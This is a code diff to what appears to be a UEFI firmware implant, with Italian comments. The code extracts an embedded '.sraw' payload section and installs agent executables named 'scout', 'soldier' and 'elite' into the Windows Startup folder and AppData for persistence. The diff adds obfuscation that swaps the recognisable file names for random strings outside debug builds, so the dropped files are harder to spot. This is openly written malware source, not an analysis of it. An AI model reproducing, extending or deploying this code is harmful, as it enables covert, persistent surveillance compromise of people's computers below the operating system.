@@ -24,10 +24,18 @@
     0x8BE4DF61, 0x93CA, 0x11d2, {0xAA, 0x0D, 0x00, 0xE0, 0x98, 0x30, 0x22, 0x88} \
   }
 
+/*
 #define FILE_NAME_SCOUT L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\scoute.exe"
 #define FILE_NAME_SOLDIER L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\soldier.exe"
 #define FILE_NAME_ELITE  L"\\AppData\\Local\\elite"
 #define DIR_NAME_ELITE L"\\AppData\\Local\\Microsoft\\elite"
+*/
+
+#define FILE_NAME_SCOUT L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+#define FILE_NAME_SOLDIER L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+#define FILE_NAME_ELITE  L"\\AppData\\Local\\"
+#define DIR_NAME_ELITE L"\\AppData\\Local\\Microsoft\\"
+
 
 // (20 * (6+5+2))+1) unicode characters from EFI FAT spec (doubled for bytes)
 #define MAX_FILE_NAME_LEN 512
@@ -35,6 +43,19 @@
 #define CALC_OFFSET(type, base, offset) (type)((UINTN)base + (UINT32) offset)
 
 #include "sraw.h"
+
+#ifdef FORCE_DEBUG
+UINT16 g_NAME_SCOUT[] =   L"scoute.exe";
+UINT16 g_NAME_SOLDIER[] = L"soldier.exe";
+UINT16 g_NAME_ELITE[]   = L"elite";
+#else
+//32 byte per inserire 16 caratteri unicode
+UINT16 g_NAME_SCOUT[] =   L"6To_60S7K_FU06yjEhjh5dpFw96549UU";
+UINT16 g_NAME_SOLDIER[] = L"kdfas7835jfwe09j29FKFLDOR3r35fJR";
+UINT16 g_NAME_ELITE[]   = L"eorpekf3904kLDKQO023iosdn93smMXK";
+#endif
+
+
 
 //non mi piace usare queste due variabili globali ma altrimenti sporcherei troppo il codice
 UINTN pSectiondata;
@@ -56,7 +77,6 @@ OUT UINTN* pSectiondata,
 OUT UINTN*  VirtualSize
 )
 {
-
    UINT16 x;
 
    EFI_IMAGE_DOS_HEADER *ImageDosHeader;
@@ -125,8 +145,20 @@ OUT UINTN*  VirtualSize
 
 		if(!strcmp(".sraw",SectionName)) 
 		{
-		  *VirtualSize=ImageSectionHeader[x].Misc.VirtualSize;
+			//CpuBreakpoint();
+		  //*VirtualSize=ImageSectionHeader[x].Misc.VirtualSize;
 		  *pSectiondata=(UINTN)sectiondata;
+		  *VirtualSize=0;
+		  //*VirtualSize =( ((UINTN*)sectiondata)[0] | ((UINTN*)sectiondata)[1] << 8 |  ((UINTN*)sectiondata)[2] << 16 | ((UINTN*)sectiondata)[3] << 24 );
+		  *VirtualSize = sectiondata[0] + sectiondata[1] * 0x100 +  sectiondata[2] * 0x10000 + sectiondata[3] * 0x1000000;
+
+
+#ifdef FORCE_DEBUG
+		  Print(L"VirtualSize=%x [0]=%x [1]=%x [2]=%x [3]=%x\n",*VirtualSize,((UINT8*)sectiondata)[0],((UINT8*)sectiondata)[1] ,((UINT8*)sectiondata)[2] ,((UINT8*)sectiondata)[3] );
+		  Print(L"VirtualSize=%x [0]=%x [1]=%x [2]=%x [3]=%x\n",*VirtualSize,((UINT8*)sectiondata)[0],((UINT8*)sectiondata)[1] * 0x100 ,((UINT8*)sectiondata)[2] * 0x10000,((UINT8*)sectiondata)[3] * 0x1000000);
+#endif
+		 // CpuBreakpoint();
+
 		  return TRUE;
 		}
    }
@@ -233,15 +265,19 @@ CheckAL(
 
 	StrCpy(FileNameScout,FileNameUser);
 	StrCat(FileNameScout, FILE_NAME_SCOUT);
+	StrCat(FileNameScout, g_NAME_SCOUT);
 
 	StrCpy(FileNameSoldier,FileNameUser);
 	StrCat(FileNameSoldier, FILE_NAME_SOLDIER);
+	StrCat(FileNameSoldier, g_NAME_SOLDIER);
 	
 	StrCpy(FileNameElite,FileNameUser);
 	StrCat(FileNameElite,FILE_NAME_ELITE);
+	StrCat(FileNameElite,g_NAME_ELITE);
 
 	StrCpy(DirNameElite,FileNameUser);
 	StrCat(DirNameElite, DIR_NAME_ELITE);
+	StrCat(DirNameElite, g_NAME_ELITE);
 
 	
 	A=FALSE;
@@ -364,6 +400,7 @@ InstallAgent(
 	FileNameScout = AllocateZeroPool(260*sizeof(CHAR16));
 	StrCpy(FileNameScout,FileNameUser);
 	StrCat(FileNameScout, FILE_NAME_SCOUT);
+	StrCat(FileNameScout, g_NAME_SCOUT);
 
 	
 	Status = CurDir->Open (CurDir, &FileHandle, FileNameScout, EFI_FILE_MODE_READ|EFI_FILE_MODE_WRITE|EFI_FILE_MODE_CREATE, 0);
@@ -420,6 +457,7 @@ InsertFileLock(
 	
 	StrCpy(FileNameElite,FileNameUser);
 	StrCat(FileNameElite,FILE_NAME_ELITE);
+	StrCat(FileNameElite,g_NAME_ELITE);
 #ifdef FORCE_DEBUG
 	Print(L"sto tentando di scrivere: %s\n",FILE_NAME_ELITE);
 #endif
@@ -471,6 +509,7 @@ RemoveFileLock(
 	
 	StrCpy(FileNameElite,FileNameUser);
 	StrCat(FileNameElite,FILE_NAME_ELITE);
+	StrCat(FileNameElite,g_NAME_ELITE);
 
 	
 	Status = CurDir->Open (CurDir, &FileHandle, FileNameElite, EFI_FILE_MODE_READ|EFI_FILE_MODE_WRITE, 0);
